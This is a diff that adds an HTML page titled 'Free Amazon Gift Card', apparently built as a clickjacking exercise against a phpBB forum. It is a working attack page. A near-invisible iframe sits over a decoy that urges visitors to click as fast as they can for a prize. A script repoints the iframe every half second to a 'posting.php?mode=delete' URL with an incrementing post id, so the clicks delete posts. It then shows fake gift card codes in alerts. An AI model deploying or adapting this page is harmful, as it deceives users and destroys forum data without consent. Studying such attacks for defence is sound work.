@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <title>Free Amazon Gift Card</title>
+  <link href="resources/css/bootstrap.css" rel="stylesheet" media="screen">
+  <script type="text/javascript" src="resources/js/jquery-1.11.0.js"></script>
+  <script type="text/javascript" src="resources/js/bootstrap.min.js"></script>
+  <link rel="shortcut icon" type="image/x-icon" href="resources/img/logo.ico">
+  <link rel="stylesheet" href="resources/css/jquery-ui.theme.css">
+  <script type="text/javascript" src="resources/js/jquery-1.11.0.js"></script>
+  <style>
+    #web_vulnerable {
+      position: relative;
+      width: 1350px;
+      height: 500px;
+      opacity: 0.5001;
+      margin: 0;
+      padding: 0;
+      display: block;
+      overflow: hidden;
+      z-index: 3;
+    }
+
+    #web_señuelo {
+      position: absolute;
+      width: 1350px;
+      height: 500px;
+      background-color: rgb(0, 0, 0);
+      z-index: 1;
+    }
+
+    #wrapper {
+      background-color: rgb(20, 20, 20);
+      text-align: center;
+    }
+
+    #centerDiv {
+      color: darkgoldenrod;
+      display: inline-block;
+    }
+
+    .input-color {
+      position: absolute;
+    }
+
+    .color-box {
+      display: inline-block;
+      background-color: #ccc;
+      position: absolute;
+      z-index: 2;
+    }
+    #B1 {
+      width: 15px;
+      height: 15px;
+      left: 1110px;
+      top: 130px;
+    }
+    #customBut {
+      background-color: #547aa5;
+      border-radius: 15px;
+      width: 35px;
+      height: 45px;
+      margin-top: 143px;
+      margin-left: 650px
+    }
+  </style>
+  <script>
+    function randomString(length) {
+    var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    var result = '';
+    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
+    return result;
+}
+    function giveResult() {
+      var c1 = randomString(4);
+      var c3 = randomString(6);
+      var c2 = randomString(5);
+      var values = [15,30,45,70,85,100];
+      var value = values[Math.floor(Math.random() * values.length)];
+      alert('Gift card number with $'+value+' dolars:\n        '+c1+'-'+c2+'-'+c3);
+}
+      function Init() {
+        setInterval(changePost, 500);
+        setInterval(giveResult, 15000);
+      }
+      var index = 0
+    function changePost() {
+      var deleteURL = "http://www.originalphpbb.com/posting.php?mode=delete&p=";
+      var newURL = deleteURL + index;
+      var outer = document.getElementById("web_vulnerable");
+      outer.setAttribute("src",newURL);
+      index = index + 1;
+      console.log(index)
+    }
+  </script>
+  
+</head>
+
+<body onload="Init();">
+  <div id="web_señuelo">
+    <div id="wrapper">
+      <h1 id="centerDiv" style="font-style: initial;"> Get free Amazon Gift Card</h2>
+    </div>
+    <div id="wrapper">
+      <div id="centerDiv" style="font-size:larger;font-style: italic;">You have 10 seconds, the more clicks you do, better gift card you would get</div>
+    </div>
+    <div class="input-color">
+	  <div style="background-color: rgb(20, 20, 20);width: 1350px;height: 50px;">
+	    <button id="customBut" onclick="myFunction()">Click Me!</button>
+	  </div>
+    </div>
+  </div>
+  <iframe id="web_vulnerable" src="" scrolling="no" frameborder="0">
+  </iframe>
+
+</body>
+</html>
